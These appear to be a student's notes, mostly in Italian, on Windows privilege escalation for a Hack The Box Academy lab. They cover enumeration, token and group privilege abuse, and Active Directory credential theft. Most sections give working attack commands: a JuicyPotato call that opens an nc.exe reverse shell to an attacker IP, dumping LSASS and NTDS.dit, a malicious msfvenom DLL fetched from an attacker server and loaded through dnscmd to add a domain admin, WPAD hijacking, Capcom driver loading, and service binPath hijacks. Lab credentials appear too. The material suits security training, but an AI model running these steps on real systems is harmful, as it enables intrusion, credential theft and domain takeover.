# Introduzione

Solitamente lo scopo di fare privesc su windows e' arrivare a utente **Local Administrator** o **NT AUTHORITY\SYSTEM**.
COME CONNETTERSI AI LAB: **xfreerdp /v:<target ip> /u:htb-student**
oppure: **rdesktop -u htb-student -p HTB_@cademy_stdnt! [IP Address]**

## Useful Tools
| Tool                                     | Description                                                                                                                                                                                                       |
|------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| Seatbelt                                 | C# project for performing a wide variety of local privilege escalation checks                                                                                                                                   |
| winPEAS                                  | WinPEAS is a script that searches for possible paths to escalate privileges on Windows hosts. All of the checks are explained here                                                                              |
| PowerUp                                  | PowerShell script for finding common Windows privilege escalation vectors that rely on misconfigurations. It can also be used to exploit some of the issues found                                               |
| SharpUp                                  | C# version of PowerUp                                                                                                                                                                                           |
| JAWS                                     | PowerShell script for enumerating privilege escalation vectors written in PowerShell 2.0                                                                                                                       |
| SessionGopher                            | PowerShell tool that finds and decrypts saved session information for remote access tools. It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information                                   |
| Watson                                   | .NET tool designed to enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities                                                                                                       |
| LaZagne                                  | Tool used for retrieving passwords stored on a local machine from web browsers, chat tools, databases, Git, email, memory dumps, PHP, sysadmin tools, wireless network configurations, internal Windows password storage mechanisms, and more |
| Windows Exploit Suggester - Next Generation (WES-NG) | Tool based on the output of Windows' systeminfo utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities. Every Windows OS between Windows XP and Windows 10, including their Windows Server counterparts, is supported |
| Sysinternals Suite                       | Includes tools like AccessChk, PipeList, and PsService for enumeration                                                                                                                                           |

Solitamente e' sempre conveniente scrivere i file in `C:\Windows\Temp` perche' abbiamo permessi di scrittura.


# Situational Awareness

We should always look at routing tables to view information about the local network and networks around it. We can also gather information about the local domain (if the host is part of an Active Directory environment), including the IP addresses of domain controllers. It is also important to use the arp command to view the ARP cache for each interface and view other hosts the host has recently communicated with. This could help us with lateral movement after obtaining credentials. It could be a good indication of which hosts administrators are connecting to via RDP or WinRM from this host.

`C:\htb> ipconfig /all`

`C:\htb> arp -a`

`C:\htb> route print` routing table

`PS C:\htb> Get-MpComputerStatus`

`PS C:\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections` list applocker rules
`PS C:\htb> Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone`

# Initial Enumeration

## Key points
- **OS Name** and **Version** sono utili per capire cosa dobbiamo cercare e se ci sono exploit pubblici.
- **Running Services**. E' importante vedere quali servizi runnano, soprattutto runnati da local administrator o NT AUTHORITY/SYSTEM.

## System Information
`C:\htb> tasklist /svc`, tasklist ritorna i processi in esecuzione.
E' importante diventare familiari con i processi standard di windows come SMSS.exe, CSRSS.exe, winlogon.exe LSASS.exe e svchost.exe. e' importante perche'
cosi' potremo spottare subito processi non standard e potenzialmente vulnerabili.

## Display ALl Environment Variables
il comando **set** per printarle.
La variabile piu' comune da vedere e' **PATH**, e molto spesso gli amministratori la modificano.

`C:\htb> set`, lista tutte le variabili d' ambiente.

## Detailed Configuration Information
il comando **systeminfo** mostra se la box e' stata patchata di recente. se non lo e' stata potremmo semplicemente runnare un known exploit.
Google the KBs installed under HotFixes to get an idea of when the box has been patched. 
The System Boot Time and OS Version can also be checked to get an idea of the patch level.

`C:\htb> systeminfo`

## Patches and Updates
Se systeminfo non mostra gli hotfixes possiamo vederli con **WMI**

`C:\htb> wmic qfe` mostra le laetst patch

`PS C:\htb> Get-HotFix | ft -AutoSize` anche questo

## Installed Programs
WMI si puo' usare anche per vedere i software installati
`C:\htb> wmic product get name`
`PS C:\htb> Get-WmiObject -Class Win32_Product |  select Name, Version`, con powershell

## Display Running Processes
`PS C:\htb> netstat -ano`

## User & Group information
### Logged-In Users
`C:\htb> query user`, per vedere gli utenti.
### Current User
`C:\htb> echo %USERNAME%`

### Current User Privileges
`C:\htb> whoami /priv`

### Current User Group Information
`C:\htb> whoami /groups`

### Get All Users
`C:\htb> net user`

### Get All Groups
`C:\htb> net localgroup`

### Deatils about a specific group
`C:\htb> net localgroup administrators`

### Password Policy and Other account info
`C:\htb> net accounts`


# Communication With Processes
Uno dei posti migliori per privesc e' guardare i processi che runnano nel sistema. Anche se non stanno runnando da amminstratore possono portare a privesc
tipo se si exploita un servizio con SeImpersonateToken.

## Access Tokens
Gli access token sono usati per descrivere il security context (attributi di sicurezza di un process o thread).
Il token include informazioni sull' identita' dell' utente e i privilegi specifici di quel processo o thread.
Quando un utente si autentica la password viene verificata contro un database, e se si autentica gli viene assegnato un access token. Ogni volta che l'utente interagisce con un process una copia di quel token viene presentata ed associata al processo.

## Enumerating Network Services

Il metodo piu' comune per interagire con i processi e' tramite network socket (DNS,HTTP,SMB etc.etc.). **netstat** mostra le connessioni TCP e UDP attive.
Potremmo trovare servizi vulnerabili.

`C:\htb> netstat -ano`.

La cosa principale da guardare sono le entry che ascoltano nei loopback addresses (**127.0.0.1** e **::\1**) che non stanno ascoltando sull' indirizzo IP della rete o sul broadcast(0.0.0.0, ::/0).
Spesso queste cose sono insicure perche' non sono accessibili dalla rete.

**Splunk Universal Forwarder** esempio di privesc.

**Erlang Port (25672)** porta spesso usata come vettore di privesc. 

## Named Pipes
Un altro modo in cui i processi comunicano tra loro sono le **Named Pipes**. Essenzialmente sono file storati in memoria che vengono ripuliti dopo essere stati letti.

Cobalt strike usa Named Piped per ogni comando. spesso pero' si usa la named pipe di un altro processo per mascherarsi.

ci sono due tipi di Pipe: **Named** e **Anonymous piped**.

Named pipes can communicate using half-duplex, or a one-way channel with the client only being able to write data to the server, or duplex, which is a two-way communication channel that allows the client to write data over the pipe, and the server to respond back with data over that pipe.

`C:\htb> pipelist.exe /accepteula` per listare le istance di Named Pipes, Pipelist e' della sysinternal suite

`PS C:\htb>  gci \\.\pipe\` con powershell.

After obtaining a listing of named pipes, we can use Accesschk to enumerate the permissions assigned to a specific named pipe by reviewing the Discretionary Access List (DACL), which shows us who has the permissions to modify, write, read, or execute a resource. Let's take a look at the LSASS process. We can also review the DACLs of all named pipes using the command .\accesschk.exe /accepteula \pipe\.

accesschk.exe /accepteula \pipe\.

`C:\htb> accesschk.exe /accepteula \\.\Pipe\lsass -v`

## Named Pipes Attack Example
Usando **accesschk** possiamo cercare tutte le named piped che ci danno permessi di scrittura

`accesschk.exe -w \pipe\* -v` comando per vedere le pipes con permessi di scrittura


# Windows Privilege Overview

## Windows Authorization Process
**Security Principals** sono qualsiasi cosa che puo' essere autenticata dal sistema operativo Windows.(computer, utenti, processi etc.etc.).

Ogni singolo Security Principal e' identificat da un unico **Security Identifier (SID)**, e appena creato un security principal gli viene assegnato il SID e gli rimane a vita.

Quando un utente prova ad accedere ad un oggetto (directory/file etc.etc.) tutte le info dell' utente come il suo SID, il SID dei gruppi di cui fa parte etc.etc. viene comparato con ogni entry della **Access Control Entries (ACEs)** finche' si trova un match e dopo si fa una decisione.


## Right and Privileges in Windows

| Group                        | Description                                                                                                                                                                                                                                                                                                  |
|------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| Default Administrators       | Domain Admins and Enterprise Admins are "super" groups.                                                                                                                                                                                                                                                     |
| Server Operators             | Members can modify services, access SMB shares, and backup files.                                                                                                                                                                                                                                           |
| Backup Operators             | Members are allowed to log onto DCs locally and should be considered Domain Admins. They can make shadow copies of the SAM/NTDS database, read the registry remotely, and access the file system on the DC via SMB. This group is sometimes added to the local Backup Operators group on non-DCs.              |
| Print Operators              | Members can log on to DCs locally and "trick" Windows into loading a malicious driver.                                                                                                                                                                                                                      |
| Hyper-V Administrators       | If there are virtual DCs, any virtualization admins, such as members of Hyper-V Administrators, should be considered Domain Admins.                                                                                                                                                                         |
| Account Operators            | Members can modify non-protected accounts and groups in the domain.                                                                                                                                                                                                                                         |
| Remote Desktop Users         | Members are not given any useful permissions by default but are often granted additional rights such as Allow Login Through Remote Desktop Services and can move laterally using the RDP protocol.                                                                                                           |
| Remote Management Users      | Members can log on to DCs with PSRemoting. This group is sometimes added to the local remote management group on non-DCs.                                                                                                                                                                                    |
| Group Policy Creator Owners  | Members can create new GPOs but would need to be delegated additional permissions to link GPOs to a container such as a domain or OU.                                                                                                                                                                        |
| Schema Admins                | Members can modify the Active Directory schema structure and backdoor any to-be-created Group/GPO by adding a compromised account to the default object ACL.                                                                                                                                                 |
| DNS Admins                   | Members can load a DLL on a DC, but do not have the necessary permissions to restart the DNS server. They can load a malicious DLL and wait for a reboot as a persistence mechanism. Loading a DLL will often result in the service crashing. A more reliable way to exploit this group is to create a WPAD record. |

## User rights assignment

| Setting Constant              | Setting Name                               | Standard Assignment                 | Description                                                                                                                                                                                                                                    |
|-------------------------------|--------------------------------------------|-------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| SeNetworkLogonRight           | Access this computer from the network     | Administrators, Authenticated Users | Determines which users can connect to the device from the network. This is required by network protocols such as SMB, NetBIOS, CIFS, and COM+.                                                                                                |
| SeRemoteInteractiveLogonRight | Allow log on through Remote Desktop Services | Administrators, Remote Desktop Users | Determines which users or groups can access the login screen of a remote device through a Remote Desktop Services connection. A user can establish a Remote Desktop Services connection but not log on to the console of the same server.         |
| SeBackupPrivilege             | Back up files and directories             | Administrators                      | Determines which users can bypass file and directory, registry, and other persistent object permissions for the purposes of backing up the system.                                                                                             |
| SeSecurityPrivilege           | Manage auditing and security log          | Administrators                      | Determines which users can specify object access audit options for individual resources such as files, Active Directory objects, and registry keys. These users can also view and clear the Security log in Event Viewer.                       |
| SeTakeOwnershipPrivilege      | Take ownership of files or other objects  | Administrators                      | Determines which users can take ownership of any securable object in the device, including Active Directory objects, NTFS files and folders, printers, registry keys, services, processes, and threads.                                         |
| SeDebugPrivilege              | Debug programs                            | Administrators                      | Determines which users can attach to or open any process, even a process they do not own. This user right provides access to sensitive and critical operating system components.                                                                |
| SeImpersonatePrivilege        | Impersonate a client after authentication | Administrators, Local Service, Network Service, Service | Determines which programs are allowed to impersonate a user or another specified account and act on behalf of the user.                                                                                                                       |
| SeLoadDriverPrivilege         | Load and unload device drivers            | Administrators                      | Determines which users can dynamically load and unload device drivers. This is not required if a signed driver already exists in the device's driver.cab file.                                                                                |
| SeRestorePrivilege            | Restore files and directories             | Administrators                      | Determines which users can bypass file, directory, registry, and other persistent object permissions when restoring backed-up files and directories. It also allows users to set valid security principals as the owner of an object.           |


Molti permessi sono visibili solo quando si runna una shell elevata. Questo concetto di elevazione dei privilegi e UAC si usa per limitare le azioni sensibli solo quando realmente necessarie.

Quando un privilegio compare come **disabled** significa che questo utente ha questo privilegio pero' non possiamo usarlo negli access token finche' non e' enabled.

Non esistono built-in commands per abilitare i privilegi disabled ma con un po' di scripting si puo' fare: https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1.

### Standard user rights
```
Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

### Backup operators rights
Questo gruppo ha anche altri privilegi che pero' UAC restringe.
```
Privilege Name                Description                    State
============================= ============================== ========
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```
### Detection
This post(https://blog.palantir.com/windows-privilege-abuse-auditing-detection-and-defense-3078a403d74e) is worth a read for more information on Windows privileges as well as detecting and preventing abuse, specifically by logging event 4672: Special privileges assigned to new logon which will generate an event if certain sensitive privileges are assigned to a new logon session. This can be fine-tuned in many ways, such as by monitoring privileges that should never be assigned or those that should only ever be assigned to specific accounts.


# SeImpersonate and SeAssignPrimaryToken
Ogni processo in windows ha un token assegnato che contiene informazioni sull' utente che l'ha runnato.

Se noi riusciamo a rubare un Token di SYSTEM e abbiamo il privilegio **SeImpersonate**(spesso posseduto da utenti di servizi) possiamo creare un processo con un token (con la Win32API **CreateProcessWithTokenW**).

**SeAssignPrimaryTokenPrivilege** serve invece per assegnare un token ad un processo . serve per eseguire **CreateProcessAsUser**

Alcuni programmi legittimi fanno cio' ovvero richiedono al processo SYSTEM **WinLogon** un token di SYSTEM e impersonano system per fare azioni privilegiate.

Questi sono i cosiddetti **potato style** attacks.

Exploiting juicy potato con una shell su mssql usando mssqlclient.py from the Impacket toolkit.
**-p** e' il processo da eseguire e **-a** gli argomenti:

`j4k1dibe@htb[/htb]$ mssqlclient.py sql_dev@10.129.43.30 -windows-auth`

`SQL> enable_xp_cmdshell`

`SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *`

# SeDebugPrivilege

di default sono gli amministratori hanno questo privilegio ma viene assegnato a chiunque deve debuggare o fare troubleshooting.

possiamo usarlo per usare ProcDump e dumpare memoria di processi. Un processo molto utile da cui dumpare memoria e' lsass.exe che contiene le credenziali.

`C:\htb> procdump.exe -accepteula -ma lsass.exe lsass.dmp`.

This is successful, and we can load this in Mimikatz using the `sekurlsa::minidump` command. After issuing the `sekurlsa::logonPasswords` commands, we gain the NTLM hash of the local administrator account logged on locally. We can use this to perform a pass-the-hash attack to move laterally if the same local administrator password is used on one or multiple additional systems (common in large organizations).

Se abbiamo RDP possiamo dumparci la memoria a mano da **Task Manager > clicca sul processo > create dump file**.

Con SeDebugPrivilege si puo' anche prendere una **RCE** come SYSTEM(https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1).

con 612 PID di winlogon.exe che abbiamo ricavato con tasklist
![image](https://github.com/user-attachments/assets/acede22f-b517-40fe-b5a3-300b2a081c6f)


# SeTakeOwnership

Da' la possibilita' ad un utente di prendere il possesso di qualsiasi securable object.

Si puo' cambiare il **WRITE_OWNER**, quindi possiamo cambiare l' owner di un oggetto nel suo security descriptor.

E' Raro trovare utenti normali con questo privilegio ma non e' raro trovare servizi che ce l'hanno.

spesso si trova su servzi che sono tasked with running backup jobs and VSS snapshots assigned this privilege.

**SeRestorePrivilege**, and **SeSecurityPrivilege** to control this account's privileges at a more granular level and not granting the account full local admin rights.

These privileges on their own could likely be used to escalate privileges. Still, there may be times when we need to take ownership of specific files because other methods are blocked, or otherwise, do not work as expected. Abusing this privilege is a bit of an edge case. Still, it is worth understanding in-depth, especially since we may also find ourselves in a scenario in an Active Directory environment where we can assign this right to a specific user that we can control and leverage it to read a sensitive file on a file share.

The setting can be set in Group Policy under:

Computer Configuration ⇾ Windows Settings ⇾ Security Settings ⇾ Local Policies ⇾ User Rights Assignment

Si puo' sfruttare ad esempio con eseguibili come: https://github.com/FSecureLABS/SharpGPOAbuse 
![image](https://github.com/user-attachments/assets/87be223d-30dc-46b2-a2a1-a8e66f4c0ade)

## Leveraging the privilege

prima **abilitiamo i privilegi disabilitati**
```
PS C:\htb> Import-Module .\Enable-Privilege.ps1
PS C:\htb> .\EnableAllTokenPrivs.ps1
PS C:\htb> whoami /priv
```

Poi **scegliamo un target file**(che puo' anche essere in una share pubblic o privata)

poi **runniamo `takeown`**: `PS C:\htb> takeown /f 'C:\Department Shares\Private\IT\cred.txt'`

checkiamo che takeown ha funzionato: `PS C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}`

modifichiamo la **ACL** del file con **icacls**: `PS C:\htb> icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F` per darci permessi

**FILE INTERESSANTI DI CUI PRENDERE IL CONTROLLO**:
```
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```
We may also come across .kdbx KeePass database files, OneNote notebooks, files such as passwords.*, pass.*, creds.*, scripts, other configuration files, virtual hard drive files, and more that we can target to extract sensitive information from to elevate our privileges and further our access.


# Windows Built-in groups

I server windows e i Domain Controller hanno parecchi gruppi built-int di default, Vengono tutti da windows server 2008 tranne Hyper-V Administrators che e' stato aggiunto dopo.

- Backup Operators
- Event Log Readers
- DnsAdmins
- Hyper-V Administrators
- Print Operators
- Server Operators

## Backup Operators
Con `whoami /groups` possiamo vedere a quali gruppi apparteniamo.

Essere di questo gruppo ci da' **SeBackup** and **SeRestore** privileges.

**SeBackupPrivilege** ci da' il permesso di listare i contenuti di qualsiasi cartella e possiamo pure copiare un file (non con il classico comando copy).
we need to programmatically copy the data, making sure to specify the FILE_FLAG_BACKUP_SEMANTICS flag.

C'e' questa PoC per usare SeBackupPrivilege per copiare un file: https://github.com/giuliano108/SeBackupPrivilege.

Come copiare:
```
PS C:\htb> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\htb> Import-Module .\SeBackupPrivilegeCmdLets.dll
```
- importare le librerie
- Checkiamo se abbiamo i permessi SeBackupPrivilege
- Abilitiamo SeBackupPrivilege con `PS C:\htb> Set-SeBackupPrivilege`
- Copiamo il file con la PoC: `PS C:\htb> Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt`

## Attacking a Domain Controller - Copying NTDS.dit
Questo gruppo permette di loggarsi come Domain Controller.

NTDS.dit is a very attractive target, as it contains the NTLM hashes for all user and computer objects in the domain.

As the NTDS.dit file is locked by default, we can use the Windows diskshadow utility to create a shadow copy of the C drive and expose it as E drive. The NTDS.dit in this shadow copy won't be in use by the system.

![image](https://github.com/user-attachments/assets/0adc0ef2-723c-4341-9ef8-c914e1534916)

infine `PS C:\htb> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit` per copiarcelo

## Backing up SAM and SYSTEM Registry Hives
The privilege also lets us back up the SAM and SYSTEM registry hives, which we can extract local account credentials offline using a tool such as Impacket's secretsdump.py

![image](https://github.com/user-attachments/assets/b603cf27-8028-4bce-920e-b907048d4441)

## Extracting Credentials from NTDS.dit

With the NTDS.dit extracted, we can use a tool such as **secretsdump.py** or the **PowerShell DSInternals** module to extract all Active Directory account credentials. Let's obtain the NTLM hash for just the administrator account for the domain using DSInternals.

```
PS C:\htb> Import-Module .\DSInternals.psd1
PS C:\htb> $key = Get-BootKey -SystemHivePath .\SYSTEM
PS C:\htb> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```

oppure

`j4k1dibe@htb[/htb]$ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL`
E dopo vanno craccate offline con hashcat.

## Robocopy

Si puo' anche usare il built-in command per copiare i file in backup mode.

Robocopy differs from the copy command in that instead of just copying all files, it can check the destination directory and remove files no longer in the source directory. It can also compare files before copying to save time by not copying files that have not been changed since the last copy/backup job ran.

`C:\htb> robocopy /B E:\Windows\NTDS .\ntds ntds.dit`

# Event Log Readers

Alcuni admin potrebbero abilitare il logging dei comandi in shell per verificare l'esecuzione di comandi loschi tipo che il PC di un tizio della sezione marketing runna `tasklist`.


`C:\htb> net localgroup "Event Log Readers"` :vedere se e' presente il gruppo di Event Log reader

Possiamo fare query ai windows events con **wevutil**.

`PS C:\htb> wevtutil qe Security /rd:true /f:text | Select-String "/user"`
We can also specify alternate credentials for wevtutil using the parameters /u and /p.

`C:\htb> wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"`

Comunque per usare Get-WInEvent non basta essere nel gruppo EventLogReaders ma bisogna pure modificare questo registro: HKLM\System\CurrentControlSet\Services\Eventlog\Security.

### Searching security logs using Get-WinEvent
N.B. 4688 e' l'event ID che un processo e' stato creato.

`PS C:\htb> Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}`

The cmdlet can also be run as another user with the -Credential parameter.

# DnsAdmins

I membri di questo gruppo hanno accesso alle informazioni DNS sulla rete.

Il servizio DNS di windows permette l' uso di plugin per risolvere nomi che non sono nello sope delle zone DNS hostate localmente.
it is possible to use the built-in dnscmd utility to specify the path of the plugin DLL.

Tipicamente il server DNS gira come NT AUTHORITY\SYSTEM.

## Attacco al servizio DNS quando runna su Domain Controller
- DNS management is performed over RPC
- ServerLevelPluginDll allows us to load a custom DLL with zero verification of the DLL's path. This can be done with the dnscmd tool from the command line
- When a member of the DnsAdmins group runs the dnscmd command below, the HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll registry key is populated
- When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)
- An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.

## Leveraging DnsAdmins Access
1) Generating Malicious DLL:`j4k1dibe@htb[/htb]$ msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll`, una dll che esegue comando cmd per aggiungere un utente ai domain admins.
3) startiamo local http server
4) scarichiamo la dll malevola `PS C:\htb>  wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"`
5) carichiamo la Dll come utente DnsAdmin: `C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll`

N.B. quando specifichiamo la dll dobbiamo per forza mettere il PATH completo altrimenti non funziona.

Questo attacco si puo' fare solo come **DnsAdmin** perche' solo **DnsAdmins** hanno accesso al tool **dnscmd.exe**.

la DLL sara' caricata la prossima volta che il DNS verra' restartato, ma essere nel gruppo DnsAdmins non ci da' il permesso di restartare il servizio di DNS ma spesso i sysadmin ce lo danno.

### findinding User's SID

`C:\htb> wmic useraccount where name="netadm" get sid`

### Checking Permissions on DNS Service

`C:\htb> sc.exe sdshow DNS` 
RPWP permissions which translate to SERVICE_START and SERVICE_STOP, respectively.

### stopping the DNS service
`C:\htb> sc stop dns`

### starting the DNS service
`C:\htb> sc start dns`

### confirming group membership
`C:\htb> net group "Domain Admins" /dom`

## Cleaning up
Questo restartare servizi potrebbe essere distruttivo perche' butta giu' il server DNS di un intero dominio

### Confirming registry key addedd
prima checkiamo se effettivamente abbiamo aggiunto la reg key ServerLevelPluginDll
`C:\htb> reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters`

### Delete the reg key
`C:\htb> reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll`

### restarting DNS server
`C:\htb> sc.exe start dns`

### Checking DNS server status
`C:\htb> sc query dns`

## Usando Mimilib.dll
https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html

Per fare ste robe possiamo usare mimilib (dagli stessi creatori di mimikatz) andando a modificare il file kdns.c (https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c)

```
/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kdns.h"

DWORD WINAPI kdns_DnsPluginInitialize(PLUGIN_ALLOCATOR_FUNCTION pDnsAllocateFunction, PLUGIN_FREE_FUNCTION pDnsFreeFunction)
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginCleanup()
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginQuery(PSTR pszQueryName, WORD wQueryType, PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)
{
	FILE * kdns_logfile;
#pragma warning(push)
#pragma warning(disable:4996)
	if(kdns_logfile = _wfopen(L"kiwidns.log", L"a"))
#pragma warning(pop)
	{
		klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
		fclose(kdns_logfile);
	    system("ENTER COMMAND HERE");
	}
	return ERROR_SUCCESS;
}
```

## Creating a WPAD Record

Un altro modo di abusare dei permessi di DnsAdmin e' creare un record WPAD. 

Membership in this group gives us the rights to disable global query block security, which by default blocks this attack. Server 2008 first introduced the ability to add to a global query block list on a DNS server. By default, Web Proxy Automatic Discovery Protocol (WPAD) and Intra-site Automatic Tunnel Addressing Protocol (ISATAP) are on the global query block list. These protocols are quite vulnerable to hijacking, and any domain user can create a computer object or DNS record containing those names.

After disabling the global query block list and creating a WPAD record, every machine running WPAD with default settings will have its traffic proxied through our attack machine. We could use a tool such as Responder or Inveigh to perform traffic spoofing, and attempt to capture password hashes and crack them offline or perform an SMBRelay attack.

### Disabling global Query block list
`C:\htb> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local`

### Adding WPAD Record
`C:\htb> Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3`


# Hyper-V Administrators

The Hyper-V Administrators group has full access to all Hyper-V features. If Domain Controllers have been virtualized, then the virtualization admins should be considered Domain Admins.	

They could easily create a clone of the live Domain Controller and mount the virtual disk offline to obtain the NTDS.dit file and extract NTLM password hashes for all users in the domain.

It is also well documented on this blog(https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/), that upon deleting a virtual machine, vmms.exe attempts to restore the original file permissions on the corresponding .vhdx file and does so as NT AUTHORITY\SYSTEM, without impersonating the user. We can delete the .vhdx file and create a native hard link to point this file to a protected SYSTEM file, which we will have full permissions to.

If the operating system is vulnerable to CVE-2018-0952 or CVE-2019-0841, we can leverage this to gain SYSTEM privileges. Otherwise, we can try to take advantage of an application on the server that has installed a service running in the context of SYSTEM, which is startable by unprivileged users.

Con questa PoC (https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1) possiamo prendere l' ownership di un file
e dopo con **takeown**.

`C:\htb> takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe`.

`C:\htb> sc.exe start MozillaMaintenance`
Note: This vector has been mitigated by the March 2020 Windows security updates, which changed behavior relating to hard links.

# Print Operators

**Print Operators** e' un gruppo con privilegi molto alti perche' hanno il permesso **SeLoadDriverPrivilege**.

It has  rights to manage, create, share, and delete printers connected to a Domain Controller, as well as the ability to log on locally to a Domain Controller and shut it dow.

**UACME**(https://github.com/hfiref0x/UACME) e' una repo con una lista di UAC bypasses utilizzabili da command line.

con questa PoC (https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp) possiamo abilitare il privilegio se disabilitato.

`C:\Users\mrb3n\Desktop\Print Operators>cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp` compiliamo la PoC

Adesso possiamo caricare driver vulnerabili tipo Capcom.sys (https://www.loldrivers.io/drivers/b51c441a-12c7-407d-9517-559cc0030cf6/)

Issue the commands below to add a reference to this driver under our HKEY_CURRENT_USER tree.
```
C:\htb> reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"

The operation completed successfully.


C:\htb> reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1

The operation completed successfully.
```
The odd syntax \??\ used to reference our malicious driver's ImagePath is an NT Object Path. The Win32 API will parse and resolve this path to properly locate and load our malicious driver.

Verificare se il driver c'e'.
```
PS C:\htb> .\DriverView.exe /stext drivers.txt
PS C:\htb> cat drivers.txt | Select-String -pattern Capcom
```

```
>sc create Capcom type= kernel binPath= C:\Users\user\Desktop\Capcom.sys
>sc start Capcom

>ExploitCapcom.exe
```

## Without GUI

Senza GUI si puo' fare ma dobbiamo cambiare del codice in ExploitCapcom.

If we do not have GUI access to the target, we will have to modify the ExploitCapcom.cpp code before compiling. Here we can edit line 292 and replace "C:\\Windows\\system32\\cmd.exe" with, say, a reverse shell binary created with msfvenom, for example: c:\ProgramData\revshell.exe.

Ci sono pure tool per caricare il driver:(https://github.com/TarlogicSecurity/EoPLoadDriver/)

`C:\htb> EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys`

## Cleanup
`C:\htb> reg delete HKCU\System\CurrentControlSet\Capcom`


# Server Operators Group

Il gruppo di Server Operator permette di gestire i Windows server senza l'assegnazione esplicita dei privilegi da Domain Admins.

E' un gruppo molto privilegiato che puo' loggare localmente sui server , inclusi i Domain Controllers.

Essere di questo gruppo ci fornisce i privilegi **SeBackupPrivilege and SeRestorePrivilege** e l' abilita' di controllare i servizi locali.

Dato che possiamo controllare i servizi locali. possiamo prendere un servizio di SYSTEM e modificarne il binPath e restartarlo.
Facciamo con il servizio AppReadiness.

`C:\htb> sc qc AppReadiness` Per verificare che SYSTEM e' l'owner

`C:\htb> c:\Tools\PsService.exe security AppReadiness` controlliamo che effettivamente abbiamo tutti i permessi sui servizi locali

`C:\htb> net localgroup Administrators` controlliamo che non siamo admin

`C:\htb> sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"` modifichiamo il binPath e ci aggiungiamo ai local Administrators

`C:\htb> sc start AppReadiness`. startiamo il servizio.

`C:\htb> net localgroup Administrators` confermiamo che siamo local admin.

## Confirming Local admin and Domain controller access
Ora abbiamo controllo totale sul domain controller e possiamo prendere tutte le credenziali dal database NTDS.
`j4k1dibe@htb[/htb]$ crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'`

